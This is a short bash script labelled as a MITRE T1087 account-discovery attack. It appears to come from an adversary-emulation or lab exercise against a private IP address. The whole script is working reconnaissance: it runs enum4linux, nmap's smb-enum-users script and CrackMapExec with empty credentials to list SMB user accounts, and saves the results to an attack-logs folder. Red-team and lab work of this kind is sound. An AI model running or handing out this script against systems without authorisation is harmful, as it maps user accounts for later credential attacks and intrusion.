#!/bin/bash
# T1087 - Account Discovery Attack Script
# Author: Greg Lewis
# Date: 2025-12-20

# Target IP
TARGET="192.168.8.18"

echo "[*] Starting account enumeration against $TARGET"
echo "[*] Timestamp: $(date)"

# Method 1: enum4linux
echo -e "\n[+] Running enum4linux..."
enum4linux -U "$TARGET" | tee ~/attack-logs/T1087-enum4linux-output.txt

# Method 2: nmap SMB enumeration
echo -e "\n[+] Running nmap SMB user enumeration..."
sudo nmap -p 445 --script smb-enum-users "$TARGET" | tee ~/attack-logs/T1087-nmap-output.txt

# Method 3: CrackMapExec (if available)
if command -v crackmapexec &> /dev/null; then
    echo -e "\n[+] Running CrackMapExec..."
    crackmapexec smb "$TARGET" -u '' -p '' --users | tee ~/attack-logs/T1087-cme-output.txt
else
    echo "[!] CrackMapExec not installed, skipping..."
fi

echo -e "\n[*] Enumeration complete!"
echo "[*] Logs saved to ~/attack-logs/"